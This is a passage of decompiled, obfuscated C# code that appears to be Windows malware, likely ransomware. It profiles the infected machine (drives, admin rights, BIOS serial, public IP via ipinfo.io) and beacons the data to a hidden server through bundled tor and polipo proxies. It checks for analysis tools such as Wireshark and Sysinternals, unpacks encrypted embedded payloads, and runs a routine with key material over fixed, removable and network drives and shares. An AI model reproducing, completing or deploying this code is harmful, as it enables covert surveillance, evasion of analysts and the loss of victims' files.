						text4 = Regex.Replace(text4, "%5", Class8.Class9.smethod_10());
						text4 = Regex.Replace(text4, "%6", Class8.Class9.smethod_16());
						text4 = Regex.Replace(text4, "%7", Class8.Class9.smethod_18());
						CultureInfo installedUICulture = CultureInfo.InstalledUICulture;
						text4 = Regex.Replace(text4, "%8", installedUICulture.TwoLetterISOLanguageName);
						text4 = Regex.Replace(text4, "%9", Convert.ToString(Environment.GetLogicalDrives().Length));
						string text6 = "";
						string text7 = "";
						string text8 = "";
						string text9 = "";
						string[] logicalDrives = Environment.GetLogicalDrives();
						*(int*)((byte*)ptr + 8) = 0;
						while (*(int*)((byte*)ptr + 8) < logicalDrives.Length)
						{
							DriveInfo driveInfo = new DriveInfo(logicalDrives[*(int*)((byte*)ptr + 8)]);
							text6 = driveInfo.DriveType switch
							{
								DriveType.Unknown => text6 + "0", 
								DriveType.NoRootDirectory => text6 + "1", 
								DriveType.Removable => text6 + "2", 
								DriveType.Fixed => text6 + "3", 
								DriveType.Network => text6 + "4", 
								DriveType.CDRom => text6 + "5", 
								DriveType.Ram => text6 + "6", 
								_ => text6 + "-1", 
							} + ",";
							text7 += driveInfo.Name.Substring(0, 1);
							text7 += ",";
							try
							{
								text8 += (driveInfo.TotalSize - driveInfo.TotalFreeSpace) / 1000000000L;
							}
							catch (Exception)
							{
								text8 += "0";
							}
							text8 += ",";
							try
							{
								text9 += driveInfo.TotalFreeSpace / 1000000000L;
							}
							catch (Exception)
							{
								text9 += "0";
							}
							text9 += ",";
							(*(int*)((byte*)ptr + 8))++;
						}
						if (text6.Substring(text6.Length - 1, 1) == ",")
						{
							text6 = text6.Remove(text6.Length - 1);
						}
						if (text7.Substring(text7.Length - 1, 1) == ",")
						{
							text7 = text7.Remove(text7.Length - 1);
						}
						if (text8.Substring(text8.Length - 1, 1) == ",")
						{
							text8 = text8.Remove(text8.Length - 1);
						}
						if (text9.Substring(text9.Length - 1, 1) == ",")
						{
							text9 = text9.Remove(text9.Length - 1);
						}
						text4 = text4.Replace("%a", text6);
						text4 = text4.Replace("%b", text7);
						text4 = text4.Replace("%c", text8);
						text4 = text4.Replace("%d", text9);
						using (WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent())
						{
							((byte*)ptr)[13] = (new WindowsPrincipal(ntIdentity).IsInRole(WindowsBuiltInRole.Administrator) ? ((byte)1) : ((byte)0));
						}
						text4 = ((((byte*)ptr)[13] != 0) ? text4.Replace("%e", "1") : text4.Replace("%e", "0"));
						text4 = Class27.smethod_119(Encoding.UTF8.GetBytes(text4));
						*(int*)((byte*)ptr + 4) = 0;
						while (true)
						{
							try
							{
								HttpWebRequest obj = (HttpWebRequest)WebRequest.Create(Class4.Class5.Class7.smethod_10().Replace("%1", text4));
								httpWebRequest.Timeout = 60000;
								httpWebRequest.Method = "GET";
								webProxy.BypassProxyOnLocal = false;
								obj.Proxy = webProxy;
								obj.UserAgent = Class4.Class5.Class7.smethod_4();
								_ = (HttpWebResponse)obj.GetResponse();
								new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
								((byte*)ptr)[12] = 1;
							}
							catch (Exception)
							{
								Thread.Sleep(60000);
								if (*(int*)((byte*)ptr + 4) > 3)
								{
									goto IL_077a;
								}
								continue;
							}
							break;
							IL_077a:
							process.Kill();
							process2.Kill();
							((byte*)ptr)[12] = 1;
							break;
						}
						break;
					}
				}
			}
			catch (Exception)
			{
				(*(int*)ptr)++;
				if (*(int*)ptr > 10)
				{
					((byte*)ptr)[12] = 0;
					break;
				}
				continue;
			}
			Class27.smethod_29(new string[2] { "tor", "polipo" });
			return false;
		}
		return ((byte*)ptr)[12] != 0;
	}

	unsafe static byte[] smethod_76(byte[] byte_0)
	{
		void* ptr = stackalloc byte[46];
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class27.smethod_27(callingAssembly, executingAssembly))
		{
			return null;
		}
		Class29.Stream0 stream = new Class29.Stream0(byte_0);
		byte[] array = new byte[0];
		*(int*)ptr = Class27.smethod_90(stream);
		if (*(int*)ptr == 67324752)
		{
			*(short*)((byte*)ptr + 44) = (short)Class27.smethod_3(stream);
			*(int*)((byte*)ptr + 4) = Class27.smethod_3(stream);
			*(int*)((byte*)ptr + 8) = Class27.smethod_3(stream);
			if (*(int*)ptr != 67324752 || *(short*)((byte*)ptr + 44) != 20 || *(int*)((byte*)ptr + 4) != 0 || *(int*)((byte*)ptr + 8) != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class27.smethod_90(stream);
			Class27.smethod_90(stream);
			Class27.smethod_90(stream);
			*(int*)((byte*)ptr + 12) = Class27.smethod_90(stream);
			*(int*)((byte*)ptr + 16) = Class27.smethod_3(stream);
			*(int*)((byte*)ptr + 20) = Class27.smethod_3(stream);
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				byte[] buffer = new byte[*(int*)((byte*)ptr + 16)];
				stream.Read(buffer, 0, *(int*)((byte*)ptr + 16));
			}
			if (*(int*)((byte*)ptr + 20) > 0)
			{
				byte[] buffer2 = new byte[*(int*)((byte*)ptr + 20)];
				stream.Read(buffer2, 0, *(int*)((byte*)ptr + 20));
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class29.Class30 @class = new Class29.Class30(array2);
			array = new byte[*(int*)((byte*)ptr + 12)];
			Class29.Class30 class30_ = @class;
			byte[] byte_ = array;
			*(int*)((byte*)ptr + 40) = array.Length;
			Class27.smethod_85(*(int*)((byte*)ptr + 40), 0, byte_, class30_);
			array2 = null;
		}
		else
		{
			*(int*)((byte*)ptr + 24) = *(int*)ptr >> 24;
			*(int*)ptr -= *(int*)((byte*)ptr + 24) << 24;
			if (*(int*)ptr != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (*(int*)((byte*)ptr + 24) == 1)
			{
				*(int*)((byte*)ptr + 28) = Class27.smethod_90(stream);
				array = new byte[*(int*)((byte*)ptr + 28)];
				*(int*)((byte*)ptr + 32) = 0;
				while (*(int*)((byte*)ptr + 32) < *(int*)((byte*)ptr + 28))
				{
					int num = Class27.smethod_90(stream);
					*(int*)((byte*)ptr + 36) = Class27.smethod_90(stream);
					byte[] array3 = new byte[num];
					stream.Read(array3, 0, array3.Length);
					Class27.smethod_85(*(int*)((byte*)ptr + 36), *(int*)((byte*)ptr + 32), array, new Class29.Class30(array3));
					*(int*)((byte*)ptr + 32) += *(int*)((byte*)ptr + 36);
				}
			}
			if (*(int*)((byte*)ptr + 24) == 2)
			{
				byte[] byte_2 = new byte[8] { 115, 207, 214, 39, 15, 120, 83, 129 };
				byte[] byte_3 = new byte[8] { 89, 224, 20, 92, 174, 148, 85, 91 };
				using ICryptoTransform cryptoTransform = Class27.smethod_24(bool_0: true, byte_3, byte_2);
				array = Class27.smethod_76(cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4));
			}
			if (*(int*)((byte*)ptr + 24) == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using ICryptoTransform cryptoTransform2 = Class27.smethod_72(byte_5, bool_0: true, byte_4);
				array = Class27.smethod_76(cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4));
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool StrongNameSignatureVerificationEx_7([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	unsafe static int smethod_77(Class29.Class33 class33_0, Class29.Class31 class31_0)
	{
		void* ptr = stackalloc byte[16];
		int num;
		int num2;
		if ((num = Class27.smethod_18(class31_0, 9)) >= 0)
		{
			if ((num2 = class33_0.short_0[num]) >= 0)
			{
				Class27.smethod_41(class31_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)ptr = -(num2 >> 4);
			*(int*)((byte*)ptr + 4) = num2 & 0xF;
			if ((num = Class27.smethod_18(class31_0, *(int*)((byte*)ptr + 4))) >= 0)
			{
				num2 = class33_0.short_0[*(int*)ptr | (num >> 9)];
				Class27.smethod_41(class31_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)((byte*)ptr + 8) = class31_0.int_2;
			num = Class27.smethod_18(class31_0, *(int*)((byte*)ptr + 8));
			num2 = class33_0.short_0[*(int*)ptr | (num >> 9)];
			if ((num2 & 0xF) <= *(int*)((byte*)ptr + 8))
			{
				Class27.smethod_41(class31_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		*(int*)((byte*)ptr + 12) = class31_0.int_2;
		num = Class27.smethod_18(class31_0, *(int*)((byte*)ptr + 12));
		num2 = class33_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= *(int*)((byte*)ptr + 12))
		{
			Class27.smethod_41(class31_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static string smethod_78()
	{
		return Class27.smethod_65("Win32_BIOS", "Manufacturer") + Class27.smethod_65("Win32_BIOS", "SMBIOSBIOSVersion") + Class27.smethod_65("Win32_BIOS", "IdentificationCode") + Class27.smethod_65("Win32_BIOS", "SerialNumber") + Class27.smethod_65("Win32_BIOS", "ReleaseDate") + Class27.smethod_65("Win32_BIOS", "Version");
	}

	static byte[] smethod_79(byte[] byte_0, int int_0, byte[] byte_1, int int_1)
	{
		try
		{
			return new Rfc2898DeriveBytes(byte_1, byte_0, int_1).GetBytes(int_0);
		}
		catch (Exception)
		{
			return null;
		}
	}

	static uint smethod_80(uint uint_0)
	{
		return uint_0 + 1;
	}

	static bool smethod_81()
	{
		try
		{
			if (!Class27.smethod_34("Sysinternals: www.sysinternals.com") && !Class27.smethod_34("wireshark") && !Class27.smethod_34("EtherD") && !Class27.smethod_34("EtherDetect") && !Class27.smethod_34("The Wireshark Network Analyzer") && !Class27.smethod_34("dumpcap") && !Class27.smethod_34("sysAnalyzer") && !Class27.smethod_34("TCPView") && !Class27.smethod_34("C:\\Program Files\\Wireshark\\") && !Class27.smethod_34("NETSTAT") && !Class27.smethod_34("sniff_hit"))
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	unsafe static bool smethod_82(Class29.Class30 class30_0)
	{
		void* ptr = stackalloc byte[8];
		switch (class30_0.int_4)
		{
		case 2:
			if (class30_0.bool_0)
			{
				class30_0.int_4 = 12;
				return false;
			}
			*(int*)ptr = Class27.smethod_18(class30_0.class31_0, 3);
			if (*(int*)ptr < 0)
			{
				return false;
			}
			Class27.smethod_41(class30_0.class31_0, 3);
			if (((uint)(*(int*)ptr) & (true ? 1u : 0u)) != 0)
			{
				class30_0.bool_0 = true;
			}
			switch (*(int*)ptr >> 1)
			{
			case 0:
				Class27.smethod_15(class30_0.class31_0);
				class30_0.int_4 = 3;
				break;
			case 1:
				class30_0.class33_0 = Class29.Class33.class33_0;
				class30_0.class33_1 = Class29.Class33.class33_1;
				class30_0.int_4 = 7;
				break;
			case 2:
				class30_0.class34_0 = new Class29.Class34();
				class30_0.int_4 = 6;
				break;
			}
			return true;
		case 3:
			if ((class30_0.int_8 = Class27.smethod_18(class30_0.class31_0, 16)) < 0)
			{
				return false;
			}
			Class27.smethod_41(class30_0.class31_0, 16);
			class30_0.int_4 = 4;
			goto case 4;
		case 4:
			if (Class27.smethod_18(class30_0.class31_0, 16) < 0)
			{
				return false;
			}
			Class27.smethod_41(class30_0.class31_0, 16);
			class30_0.int_4 = 5;
			goto case 5;
		case 5:
			*(int*)((byte*)ptr + 4) = Class27.smethod_61(class30_0.class32_0, class30_0.class31_0, class30_0.int_8);
			class30_0.int_8 -= *(int*)((byte*)ptr + 4);
			if (class30_0.int_8 == 0)
			{
				class30_0.int_4 = 2;
				return true;
			}
			return !Class27.smethod_69(class30_0.class31_0);
		case 6:
			if (!Class27.smethod_59(class30_0.class34_0, class30_0.class31_0))
			{
				return false;
			}
			class30_0.class33_0 = Class27.smethod_125(class30_0.class34_0);
			class30_0.class33_1 = Class27.smethod_19(class30_0.class34_0);
			class30_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class27.smethod_71(class30_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	static int smethod_83(Class29.Class31 class31_0)
	{
		return class31_0.int_1 - class31_0.int_0 + (class31_0.int_2 >> 3);
	}

	static void smethod_84(string string_0, byte[] byte_0, byte[] byte_1)
	{
		Class27.smethod_66(string_0);
		if (!Class4.Class5.smethod_28())
		{
			Class27.smethod_53(byte_1, byte_0);
		}
	}

	unsafe static int smethod_85(int int_0, int int_1, byte[] byte_0, Class29.Class30 class30_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		do
		{
			if (class30_0.int_4 != 11)
			{
				*(int*)((byte*)ptr + 4) = Class27.smethod_47(byte_0, int_1, int_0, class30_0.class32_0);
				int_1 += *(int*)((byte*)ptr + 4);
				*(int*)ptr += *(int*)((byte*)ptr + 4);
				int_0 -= *(int*)((byte*)ptr + 4);
				if (int_0 == 0)
				{
					return *(int*)ptr;
				}
			}
		}
		while (Class27.smethod_82(class30_0) || (class30_0.class32_0.int_1 > 0 && class30_0.int_4 != 11));
		return *(int*)ptr;
	}

	static bool smethod_86()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		if (PlatformID.Win32NT == oSVersion.Platform && oSVersion.Version.Major >= 5)
		{
			return true;
		}
		return false;
	}

	static void smethod_87()
	{
		Class27.smethod_106(Class8.Class9.smethod_2(), Class8.Class9.smethod_4());
		Class8.Class9.smethod_3(null);
		Class8.Class9.smethod_5(null);
	}

	static Miscellaneous.Class16 smethod_88()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Miscellaneous.Class16 @class = new Miscellaneous.Class16();
		@class.method_1(Class27.smethod_70(oSVersion));
		@class.method_5(oSVersion.Version.Major);
		@class.method_3(oSVersion.Version.Minor);
		@class.method_7(oSVersion.Version.Build);
		return @class;
	}

	static bool smethod_89(string string_0, Class2 class2_0)
	{
		if (!Class27.smethod_11(class2_0))
		{
			return false;
		}
		if (string.IsNullOrEmpty(string_0))
		{
			return true;
		}
		return string_0.ToLower().StartsWith(class2_0.method_2().ToLower());
	}

	static int smethod_90(Class29.Stream0 stream0_0)
	{
		return Class27.smethod_3(stream0_0) | (Class27.smethod_3(stream0_0) << 16);
	}

	static string smethod_91(string string_0, string string_1)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_1);
			processStartInfo.Arguments = string_0;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			process.StartInfo = processStartInfo;
			process.Start();
			string result = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return result;
		}
		catch (Exception)
		{
			return null;
		}
	}

	static int smethod_92(Class29.Class32 class32_0)
	{
		return 32768 - class32_0.int_1;
	}

	static void smethod_93(Class29.Class32 class32_0, int int_0)
	{
		if (class32_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class32_0.byte_0[class32_0.int_0++] = (byte)int_0;
		class32_0.int_0 &= 32767;
	}

	static uint smethod_94(byte[] byte_0, int int_0)
	{
		return (uint)(byte_0[int_0] | (byte_0[int_0 + 1] << 8) | (byte_0[int_0 + 2] << 16) | (byte_0[int_0 + 3] << 24));
	}

	unsafe static byte[] smethod_95(byte[][] byte_0)
	{
		void* ptr = stackalloc byte[8];
		byte[] array = new byte[byte_0.Sum((byte[] byte_0) => byte_0.Length)];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < byte_0.Length)
		{
			byte[] array2 = byte_0[*(int*)((byte*)ptr + 4)];
			Buffer.BlockCopy(array2, 0, array, *(int*)ptr, array2.Length);
			*(int*)ptr += array2.Length;
			(*(int*)((byte*)ptr + 4))++;
		}
		return array;
	}

	static bool smethod_96(string string_0)
	{
		try
		{
			if (string_0.Contains(".exe"))
			{
				string_0 = string_0.Replace(".exe", "");
			}
			if (Process.GetProcessesByName(string_0).Length != 0)
			{
				return true;
			}
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	unsafe static string[] smethod_97(string string_0)
	{
		void* ptr = stackalloc byte[6];
		string[] array = new string[2];
		((byte*)ptr)[4] = 0;
		((byte*)ptr)[5] = 0;
		*(int*)ptr = 0;
		while (*(int*)ptr < string_0.Length && ((byte*)ptr)[5] == 0)
		{
			if (string_0[*(int*)ptr] == '"' && (*(int*)ptr == 0 || string_0[*(int*)ptr - 1] != '\\'))
			{
				if (((byte*)ptr)[4] == 0)
				{
					((byte*)ptr)[4] = 1;
					(*(int*)ptr)++;
				}
				else
				{
					array[0] = string_0.Substring(1, *(int*)ptr - 1);
					array[1] = string_0.Substring(*(int*)ptr + 2);
					((byte*)ptr)[5] = 1;
				}
			}
			else
			{
				(*(int*)ptr)++;
			}
		}
		return array;
	}

	static string smethod_98(string string_0, string string_1)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_0);
			processStartInfo.Arguments = string_1;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			process.StartInfo = processStartInfo;
			process.Start();
			string result = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return result;
		}
		catch (Exception)
		{
			return null;
		}
	}

	unsafe static void smethod_99(Class21.Class22 class22_0, Class21 class21_0, Stream stream_0)
	{
		void* ptr = stackalloc byte[12];
		class21_0.method_0().Seek(class22_0.method_12(), SeekOrigin.Begin);
		if (class21_0.method_2().ReadInt32() != 67324752)
		{
			throw new InvalidDataException("File signature doesn't match.");
		}
		class21_0.method_0().Seek(class22_0.method_14(), SeekOrigin.Begin);
		Stream stream = class21_0.method_0();
		if (class22_0.method_8())
		{
			stream = new DeflateStream(class21_0.method_0(), CompressionMode.Decompress, leaveOpen: true);
		}
		*(int*)ptr = class22_0.method_6();
		*(int*)((byte*)ptr + 4) = Math.Min(16384, class22_0.method_6());
		byte[] array = new byte[*(int*)((byte*)ptr + 4)];
		Class21.Class23 @class = new Class21.Class23();
		while (*(int*)ptr > 0)
		{
			*(int*)((byte*)ptr + 8) = stream.Read(array, 0, *(int*)((byte*)ptr + 4));
			if (*(int*)((byte*)ptr + 8) == 0)
			{
				break;
			}
			Class27.smethod_21(*(int*)((byte*)ptr + 8), @class, array);
			stream_0.Write(array, 0, *(int*)((byte*)ptr + 8));
			*(int*)ptr -= *(int*)((byte*)ptr + 8);
		}
		if ((@class.uint_1 ^ 0xFFFFFFFFu) != class22_0.method_3())
		{
			throw new InvalidDataException($"Corrupted archive: CRC32 doesn't match on file {class22_0.method_0()}: expected {class22_0.method_3():x8}, got {@class.uint_1 ^ 0xFFFFFFFFu:x8}.");
		}
	}

	static DateTime smethod_100(int int_0)
	{
		return new DateTime((int_0 >> 25) + 1980, (int_0 >> 21) & 0xF, (int_0 >> 16) & 0x1F, (int_0 >> 11) & 0x1F, (int_0 >> 5) & 0x3F, (int_0 & 0x1F) * 2);
	}

	static int smethod_101(Class29.Class32 class32_0)
	{
		return class32_0.int_1;
	}

	static string smethod_102()
	{
		string text = "";
		int num = 0;
		do
		{
			try
			{
				HttpWebRequest obj = (HttpWebRequest)WebRequest.Create("https://ipinfo.io/json");
				obj.Timeout = 10000;
				obj.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko";
				HttpWebResponse httpWebResponse = (HttpWebResponse)obj.GetResponse();
				text = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.GetEncoding(httpWebResponse.CharacterSet)).ReadToEnd();
			}
			catch (Exception)
			{
			}
			num++;
			if (string.IsNullOrEmpty(text) && num >= 3)
			{
				return null;
			}
		}
		while (string.IsNullOrEmpty(text));
		return Regex.Split(text, "\"ip\": \"")[1].Split(new char[1] { '"' })[0] + char.ToString(',') + Regex.Split(text, "\"org\": \"")[1].Split(new char[1] { '"' })[0] + char.ToString(',') + Regex.Split(text, "\"city\": \"")[1].Split(new char[1] { '"' })[0] + char.ToString(',') + Regex.Split(text, "\"country\": \"")[1].Split(new char[1] { '"' })[0];
	}

	static void smethod_103(string string_0, Class3 class3_0)
	{
		if (!string.IsNullOrEmpty(string_0) && !Class27.smethod_86())
		{
			string_0 = string_0.ToUpper();
			if ('\\' != string_0[0] || '\\' != string_0[1])
			{
				string_0 = "\\\\" + string_0;
			}
		}
		if (Class27.smethod_126())
		{
			Class27.smethod_33(string_0, class3_0);
		}
		else
		{
			Class27.smethod_120(string_0, class3_0);
		}
	}

	unsafe static string smethod_104(JsonNode jsonNode_0)
	{
		void* ptr = stackalloc byte[9];
		string text = jsonNode_0.vmethod_0();
		string text2 = string.Empty;
		*(int*)ptr = 0;
		while (*(int*)ptr < 1)
		{
			text2 += "\t";
			(*(int*)ptr)++;
		}
		((byte*)ptr)[8] = 0;
		string text3 = string.Empty;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < text.Length)
		{
			switch (text[*(int*)((byte*)ptr + 4)])
			{
			case ':':
				if (((byte*)ptr)[8] == 0)
				{
					text = text.Insert(*(int*)((byte*)ptr + 4) + 1, " ");
				}
				break;
			case ',':
				if (((byte*)ptr)[8] == 0)
				{
					text = text.Insert(*(int*)((byte*)ptr + 4) + 1, "\n" + text3);
				}
				break;
			case '"':
				if (*(int*)((byte*)ptr + 4) == 0 || text[*(int*)((byte*)ptr + 4) - 1] != '\\')
				{
					((byte*)ptr)[8] = ((((byte*)ptr)[8] == 0) ? ((byte)1) : ((byte)0));
				}
				break;
			case ']':
			case '}':
				if (((byte*)ptr)[8] == 0)
				{
					text3 = text3.Substring(0, text3.Length - text2.Length);
					text = text.Insert(*(int*)((byte*)ptr + 4), "\n" + text3);
					*(int*)((byte*)ptr + 4) += text3.Length + 1;
				}
				break;
			case '[':
			case '{':
				if (((byte*)ptr)[8] == 0)
				{
					text3 += text2;
					text = text.Insert(*(int*)((byte*)ptr + 4) + 1, "\n" + text3);
				}
				break;
			}
			(*(int*)((byte*)ptr + 4))++;
		}
		return text;
	}

	unsafe static string smethod_105(string string_0)
	{
		void* ptr = stackalloc byte[5];
		StringBuilder stringBuilder = new StringBuilder();
		*(int*)ptr = 0;
		while (*(int*)ptr < string_0.Length)
		{
			char c = string_0[*(int*)ptr];
			switch (c)
			{
			case '"':
				stringBuilder.Append("\\\"");
				break;
			case '\b':
				stringBuilder.Append("\\b");
				break;
			case '\t':
				stringBuilder.Append("\\t");
				break;
			case '\n':
				stringBuilder.Append("\\n");
				break;
			case '\f':
				stringBuilder.Append("\\f");
				break;
			case '\r':
				stringBuilder.Append("\\r");
				break;
			case '\\':
				stringBuilder.Append("\\\\");
				break;
			default:
				if (c < ' ')
				{
					((byte*)ptr)[4] = Convert.ToByte(c);
					stringBuilder.Append("\\u00" + ((byte*)ptr)[4].ToString("x2").ToUpper());
				}
				else
				{
					stringBuilder.Append(c);
				}
				break;
			case '/':
				stringBuilder.Append(c);
				break;
			}
			(*(int*)ptr)++;
		}
		return stringBuilder.ToString();
	}

	unsafe static void smethod_106(byte[] byte_0, byte[] byte_1)
	{
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		void* ptr = stackalloc byte[5];
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			*(int*)ptr = 0;
			while (*(int*)ptr < logicalDrives.Length)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[*(int*)ptr]);
				if (((driveInfo.IsReady && driveInfo.DriveType != DriveType.CDRom) || driveInfo.DriveType != 0) && Class4.Class5.smethod_22() && driveInfo.DriveType == DriveType.Network)
				{
					Class27.smethod_84(driveInfo.Name, byte_0, byte_1);
				}
				(*(int*)ptr)++;
			}
			logicalDrives = Environment.GetLogicalDrives();
			*(int*)ptr = 0;
			while (*(int*)ptr < logicalDrives.Length)
			{
				DriveInfo driveInfo2 = new DriveInfo(logicalDrives[*(int*)ptr]);
				if (((driveInfo2.IsReady && driveInfo2.DriveType != DriveType.CDRom) || driveInfo2.DriveType != 0) && ((Class4.Class5.smethod_20() && driveInfo2.DriveType == DriveType.Fixed) || (Class4.Class5.smethod_24() && driveInfo2.DriveType == DriveType.Removable && driveInfo2.DriveType != DriveType.Network)))
				{
					Class27.smethod_84(driveInfo2.Name, byte_0, byte_1);
				}
				(*(int*)ptr)++;
			}
			Class3 @class = Class27.smethod_38();
			if (@class == null)
			{
				return;
			}
			foreach (object item in @class)
			{
				string text = item.ToString();
				((byte*)ptr)[4] = 0;
				if (!text.Contains("ADMIN$") && !text.Contains("IPC$") && !text.Contains("print$") && !text.Contains("$"))
				{
					((byte*)ptr)[4] = 1;
				}
				if (((byte*)ptr)[4] != 0)
				{
					Class27.smethod_84(text, byte_0, byte_1);
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
	}

	static string[] smethod_107(string string_0)
	{
		return string_0.Replace("[\n\t\"", "").Replace("\n\t\"", "").Replace("\"", "")
			.Replace("\n]", "")
			.Replace("[\n\t", "")
			.Replace("\n\t", "")
			.Split(new char[1] { ',' });
	}

	static int smethod_108(string string_0)
	{
		try
		{
			return Convert.ToInt32(string_0, 16);
		}
		catch (Exception)
		{
			return -1;
		}
	}

	unsafe static int smethod_109(Class21 class21_0, int int_0)
	{
		void* ptr = stackalloc byte[12];
		*(long*)ptr = class21_0.method_0().Position;
		class21_0.method_0().Seek(int_0 + 26, SeekOrigin.Begin);
		*(short*)((byte*)ptr + 8) = class21_0.method_2().ReadInt16();
		*(short*)((byte*)ptr + 10) = class21_0.method_2().ReadInt16();
		int result = (int)class21_0.method_0().Position + *(short*)((byte*)ptr + 8) + *(short*)((byte*)ptr + 10);
		class21_0.method_0().Seek(*(long*)ptr, SeekOrigin.Begin);
		return result;
	}

	static IEnumerator smethod_110(JsonObject jsonObject_0)
	{
		return new JsonObject.Class0(0)
		{
			jsonObject_0 = jsonObject_0
		};
	}

	static uint smethod_111(Class21.Class23 class23_0)
	{
		return class23_0.uint_1 ^ 0xFFFFFFFFu;
	}

	unsafe static bool smethod_112(string string_0)
	{
		void* ptr = stackalloc byte[5];
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			string text = directoryInfo.Attributes.ToString();
			if (!text.Contains("Hidden") && !text.Contains("System"))
			{
				File.Create(Path.Combine(string_0, "Touch")).Dispose();
				File.Delete(Path.Combine(string_0, "Touch"));
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
				if (!(string_0 == Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)) && (!folderPath.Contains("(x86)") || !(string_0 == folderPath.Replace(" (x86)", ""))))
				{
					string[] array = Class4.Class5.smethod_54();
					*(int*)ptr = 0;
					while (true)
					{
						if (*(int*)ptr < array.Length)
						{
							string text2 = array[*(int*)ptr];
							if (!(directoryInfo.Name.ToLower() == text2))
							{
								(*(int*)ptr)++;
								continue;
							}
							((byte*)ptr)[4] = 0;
							break;
						}
						((byte*)ptr)[4] = 1;
						break;
					}
				}
				else
				{
					((byte*)ptr)[4] = 0;
				}
			}
			else
			{
				((byte*)ptr)[4] = 0;
			}
		}
		catch (Exception)
		{
			((byte*)ptr)[4] = 0;
		}
		return ((byte*)ptr)[4] != 0;
	}

	static string smethod_113(string string_0)
	{
		StringBuilder stringBuilder = new StringBuilder(string_0.Length);
		for (int i = 0; i < string_0.Length; i++)
		{
			if (string_0[i] == '\\')
			{
				i++;
				switch (string_0[i])
				{
				case '\\':
					stringBuilder.Append(string_0[i]);
					break;
				case '/':
					stringBuilder.Append(string_0[i]);
					break;
				case '"':
					stringBuilder.Append(string_0[i]);
					break;
				case 'f':
					stringBuilder.Append('\f');
					break;
				case 'b':
					stringBuilder.Append('\b');
					break;
				case 'r':
					stringBuilder.Append('\r');
					break;
				default:
					stringBuilder.Append(string_0[i]);
					break;
				case 't':
					stringBuilder.Append('\t');
					break;
				case 'u':
					stringBuilder.Append((char)int.Parse(string_0.Substring(i + 1, 4), NumberStyles.AllowHexSpecifier));
					i += 4;
					break;
				case 'n':
					stringBuilder.Append('\n');
					break;
				}
			}
			else
			{
				stringBuilder.Append(string_0[i]);
			}
		}
		return stringBuilder.ToString();
	}

	static string smethod_114(OperatingSystem operatingSystem_0)
	{
		string result = "Unknown";
		switch (operatingSystem_0.Version.Major)
		{
		case 3:
			result = "Windows NT 3.51";
			break;
		case 4:
			result = "Windows NT 4.0";
			break;
		case 5:
			switch (operatingSystem_0.Version.Minor)
			{
			case 0:
				result = "Windows 2000";
				break;
			case 1:
				result = "Windows XP";
				break;
			case 2:
				result = "Windows 2003";
				break;
			}
			break;
		case 6:
			switch (operatingSystem_0.Version.Minor)
			{
			case 0:
				result = "Windows Vista";
				break;
			case 1:
				result = "Windows 7";
				break;
			case 2:
				result = "Windows 8";
				break;
			case 3:
				result = "Windows 8.1";
				break;
			}
			break;
		case 10:
			result = "Windows 10";
			break;
		}
		return result;
	}

	static byte[] smethod_115(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		try
		{
			using MemoryStream memoryStream = new MemoryStream();
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
